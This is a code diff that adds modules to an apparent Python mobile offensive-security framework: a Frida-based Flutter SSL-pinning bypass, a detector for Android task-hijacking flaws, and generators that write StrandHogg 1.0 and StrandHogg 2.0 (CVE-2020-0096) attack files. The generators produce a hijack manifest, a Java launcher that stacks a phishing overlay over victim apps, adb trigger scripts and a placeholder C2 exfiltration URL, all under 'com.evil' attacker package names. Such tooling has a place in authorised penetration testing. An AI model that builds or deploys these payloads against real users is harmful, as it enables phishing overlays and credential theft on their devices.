@@ -1158,6 +1158,34 @@ class MassiveMobileSecurityFramework:
         elif cmd == "back":
             return 2
 
+    def bypass_flutter_ssl_frida(self, cmd, data):
+        self._frida.config = data
+        if cmd == "run":
+            if self._frida.config["app"]:
+                threading.Thread(target=self._frida.bypass_flutter_ssl, args=([])).start()
+                return 1
+            else:
+                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
+                return 0
+        elif cmd == "show":
+            print_show_table([
+                {"name": "MODE",   "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE",
+                "description": "Serial or Remote. Default: Serial", "required": False},
+                {"name": "APP",    "value": self._frida.config["app"],
+                "description": "Package name: com.example.flutter"},
+                {"name": "HOST",   "value": self._frida.config["host"],
+                "description": "Host if MODE=Remote. Default: 127.0.0.1", "required": False},
+                {"name": "PAUSE",  "value": "TRUE" if self._frida.config["pause"] == "--pause" else "FALSE",
+                "description": "Pause app on start. Default: FALSE", "required": False},
+                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == "-f" else "FRONTMOST",
+                "description": "Attach method. Default: SPAWN", "required": False}])
+            return 0
+        elif cmd == "exit":
+            quit_app()
+        elif cmd == "back":
+            back()
+            return 2
+
     # Antifrida bypass
     def antifrida_bypass(self, cmd, data):
         pass    
@@ -1579,4 +1607,222 @@ class MassiveMobileSecurityFramework:
         elif cmd == "exit":
             quit_app()
         elif cmd == "back":
+            return 2
+
+    def taskhijacking(self, cmd, data):
+        import os, xml.etree.ElementTree as ET
+        from Classes.constants import Constants
+
+        mode = data.get("mode", "detect")
+
+        if cmd == "run":
+            # ── DETECT mode ──────────────────────────────────────
+            if mode == "detect":
+                manifest_path = data.get("manifest_path", "")
+                if not manifest_path:
+                    for root, dirs, files in os.walk("apktool_files"):
+                        for f in files:
+                            if f == "AndroidManifest.xml":
+                                manifest_path = os.path.join(root, f)
+                                break
+                        if manifest_path:
+                            break
+                if not manifest_path or not os.path.exists(manifest_path):
+                    print(Fore.RED + "[-] AndroidManifest.xml not found. Set manifest_path or decompile first." + Fore.RESET)
+                    return 0
+                try:
+                    tree = ET.parse(manifest_path)
+                    root_elem = tree.getroot()
+                    ns = "http://schemas.android.com/apk/res/android"
+                    package = root_elem.get("package", "unknown")
+                    print(Fore.CYAN + f"\n[*] Scanning: {manifest_path}" + Fore.RESET)
+                    print(Fore.CYAN + f"[*] Package : {package}" + Fore.RESET)
+                    sdk_node = root_elem.find(".//uses-sdk")
+                    min_sdk = 0
+                    if sdk_node is not None:
+                        try:
+                            min_sdk = int(sdk_node.get(f"{{{ns}}}minSdkVersion", "0"))
+                        except ValueError:
+                            pass
+                    if min_sdk >= 30:
+                        print(Fore.YELLOW + f"[!] minSdkVersion={min_sdk} — OS patch present (Android 11+)." + Fore.RESET)
+                    else:
+                        print(Fore.GREEN + f"[+] minSdkVersion={min_sdk} — Potentially vulnerable to StrandHogg 1.0!" + Fore.RESET)
+                    vulnerable = []
+                    for activity in root_elem.iter("activity"):
+                        if activity.get(f"{{{ns}}}launchMode", "") == "singleTask":
+                            vulnerable.append({
+                                "activity": activity.get(f"{{{ns}}}name", "unknown"),
+                                "taskAffinity": activity.get(f"{{{ns}}}taskAffinity", f"{package} (default)"),
+                                "exported": activity.get(f"{{{ns}}}exported", "false")
+                            })
+                    if vulnerable:
+                        print(Fore.RED + f"\n[!] {len(vulnerable)} singleTask activity(ies) found:\n" + Fore.RESET)
+                        for v in vulnerable:
+                            print(Fore.RED + f"    Activity    : {v['activity']}" + Fore.RESET)
+                            print(Fore.YELLOW + f"    taskAffinity: {v['taskAffinity']}" + Fore.RESET)
+                            print(Fore.YELLOW + f"    exported    : {v['exported']}\n" + Fore.RESET)
+                    else:
+                        print(Fore.GREEN + "[+] No singleTask activities found." + Fore.RESET)
+                    return 1
+                except ET.ParseError as e:
+                    print(Fore.RED + f"[-] Parse error: {e}" + Fore.RESET)
+                    return 0
+
+            # ── GENERATE mode ────────────────────────────────────
+            elif mode == "generate":
+                target_pkg = data.get("target_package", "")
+                target_act = data.get("target_activity", "")
+                if not target_pkg or not target_act:
+                    print(Fore.RED + "[-] Set target_package and target_activity first." + Fore.RESET)
+                    return 0
+                attacker_pkg = data.get("attacker_package", "com.evil.hijack")
+                phish_text = data.get("phishing_text", "Session expired.")
+                loot = data.get("loot_path", Constants.DIR_LOOT_PATH.value)
+                os.makedirs(loot, exist_ok=True)
+
+                manifest = f"""<activity
+    android:name=".HijackActivity"
+    android:taskAffinity="{target_pkg}"
+    android:launchMode="singleTask"
+    android:allowTaskReparenting="true">
+    <intent-filter>
+        <action android:name="android.intent.action.MAIN"/>
+        <category android:name="android.intent.category.LAUNCHER"/>
+    </intent-filter>
+</activity>"""
+                java = f"""package {attacker_pkg};
+// StrandHogg 1.0 — HijackActivity
+// taskAffinity set to: {target_pkg}
+// Overlay text: {phish_text}
+// Add this to your attacker APK and set taskAffinity in manifest.
+"""
+                trigger = f"""#!/bin/bash
+adb shell am start -n {attacker_pkg}/.HijackActivity --activity-task-on-home
+"""
+                with open(os.path.join(loot, "taskhijack_manifest.xml"), "w") as f:
+                    f.write(manifest)
+                with open(os.path.join(loot, "HijackActivity.java"), "w") as f:
+                    f.write(java)
+                with open(os.path.join(loot, "trigger.sh"), "w") as f:
+                    f.write(trigger)
+                os.chmod(os.path.join(loot, "trigger.sh"), 0o755)
+                print(Fore.GREEN + f"[+] Payload saved to {loot}" + Fore.RESET)
+                return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name": "MODE",             "value": data.get("mode", "detect"),          "description": "detect | generate"},
+                {"name": "MANIFEST_PATH",    "value": data.get("manifest_path", ""),       "description": "Path to AndroidManifest.xml (detect mode)", "required": False},
+                {"name": "TARGET_PACKAGE",   "value": data.get("target_package", ""),      "description": "Victim app package (generate mode)"},
+                {"name": "TARGET_ACTIVITY",  "value": data.get("target_activity", ""),     "description": "Victim main activity (generate mode)"},
+                {"name": "ATTACKER_PACKAGE", "value": data.get("attacker_package", ""),    "description": "Attacker package name", "required": False},
+                {"name": "PHISHING_TEXT",    "value": data.get("phishing_text", ""),       "description": "Fake login screen text", "required": False},
+                {"name": "LOOT_PATH",        "value": data.get("loot_path", ""),           "description": "Output directory", "required": False},
+            ])
+            return 0
+        elif cmd == "exit":
+            quit_app()
+        elif cmd == "back":
+            back()
+            return 2
+
+    def strandhogg(self, cmd, data):
+        import subprocess, os
+        from subprocess import PIPE
+        from Classes.constants import Constants
+
+        mode = data.get("mode", "check")
+
+        if cmd == "run":
+            # ── CHECK mode ───────────────────────────────────────
+            if mode == "check":
+                try:
+                    api = int(subprocess.run(
+                        ["adb", "shell", "getprop", "ro.build.version.sdk"],
+                        capture_output=True, text=True, timeout=10).stdout.strip())
+                    patch = subprocess.run(
+                        ["adb", "shell", "getprop", "ro.build.version.security_patch"],
+                        capture_output=True, text=True, timeout=10).stdout.strip()
+                    ver = subprocess.run(
+                        ["adb", "shell", "getprop", "ro.build.version.release"],
+                        capture_output=True, text=True, timeout=10).stdout.strip()
+                    print(Fore.CYAN + f"\n[*] Android {ver} (API {api}) | Patch: {patch}" + Fore.RESET)
+                    if api <= 28:
+                        print(Fore.RED + "[!!!] FULLY VULNERABLE to StrandHogg 2.0 (CVE-2020-0096)" + Fore.RESET)
+                    elif api == 29 and patch < "2020-05-01":
+                        print(Fore.RED + "[!!!] VULNERABLE — Android 10 without May 2020 patch" + Fore.RESET)
+                    else:
+                        print(Fore.GREEN + "[+] Patched — StrandHogg 2.0 not exploitable on this device." + Fore.RESET)
+                    return 1
+                except Exception as e:
+                    print(Fore.RED + f"[-] ADB error: {e}" + Fore.RESET)
+                    return 0
+
+            # ── GENERATE mode ────────────────────────────────────
+            elif mode == "generate":
+                targets = data.get("multi_target") or ([data["target_package"]] if data.get("target_package") else [])
+                if not targets:
+                    print(Fore.RED + "[-] Set target_package or add_target first." + Fore.RESET)
+                    return 0
+                loot = data.get("loot_path", Constants.DIR_LOOT_PATH.value)
+                os.makedirs(loot, exist_ok=True)
+                c2 = data.get("c2_url", "http://YOUR_C2/loot")
+                phish = data.get("phishing_text", "Session expired.")
+                attacker = data.get("attacker_package", "com.evil.strandhogg2")
+
+                java = f"""package {attacker};
+// StrandHogg 2.0 — CVE-2020-0096
+// Targets: {', '.join(targets)}
+// Uses startActivities(Intent[]) — no manifest config needed
+import android.app.Activity;
+import android.content.Intent;
+import android.os.Bundle;
+import java.util.ArrayList;
+public class StrandHogg2Launcher extends Activity {{
+    @Override
+    protected void onCreate(Bundle b) {{
+        super.onCreate(b);
+        ArrayList<Intent> intents = new ArrayList<>();
+        Intent phish = new Intent(this, PhishingOverlayActivity.class);
+        phish.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
+        intents.add(0, phish);
+"""
+                for pkg in targets:
+                    java += f"""        Intent i_{pkg.replace('.','_')} = getPackageManager().getLaunchIntentForPackage("{pkg}");
+        if (i_{pkg.replace('.','_')} != null) intents.add(i_{pkg.replace('.','_')});
+"""
+                java += f"""        startActivities(intents.toArray(new Intent[0]));
+        finish();
+    }}
+}}
+// C2: {c2} | Phish text: {phish}
+"""
+                trigger = f"""#!/bin/bash
+adb shell am start -n {attacker}/.StrandHogg2Launcher
+"""
+                with open(os.path.join(loot, "StrandHogg2Payload.java"), "w") as f:
+                    f.write(java)
+                with open(os.path.join(loot, "strandhogg2_trigger.sh"), "w") as f:
+                    f.write(trigger)
+                os.chmod(os.path.join(loot, "strandhogg2_trigger.sh"), 0o755)
+                print(Fore.GREEN + f"[+] StrandHogg 2.0 payload saved to {loot}" + Fore.RESET)
+                print(Fore.YELLOW + f"[*] Targets: {', '.join(targets)}" + Fore.RESET)
+                return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name": "MODE",             "value": data.get("mode", "check"),            "description": "check | generate"},
+                {"name": "TARGET_PACKAGE",   "value": data.get("target_package", ""),       "description": "Primary victim app package"},
+                {"name": "ADD_TARGET",       "value": str(data.get("multi_target", [])),    "description": "Additional targets (StrandHogg 2.0 hits multiple)", "required": False},
+                {"name": "ATTACKER_PACKAGE", "value": data.get("attacker_package", ""),     "description": "Attacker package name", "required": False},
+                {"name": "C2_URL",           "value": data.get("c2_url", ""),               "description": "Exfil endpoint", "required": False},
+                {"name": "PHISHING_TEXT",    "value": data.get("phishing_text", ""),        "description": "Fake screen text", "required": False},
+                {"name": "LOOT_PATH",        "value": data.get("loot_path", ""),            "description": "Output directory", "required": False},
+            ])
+            return 0
+        elif cmd == "exit":
+            quit_app()
+        elif cmd == "back":
+            back()
             return 2
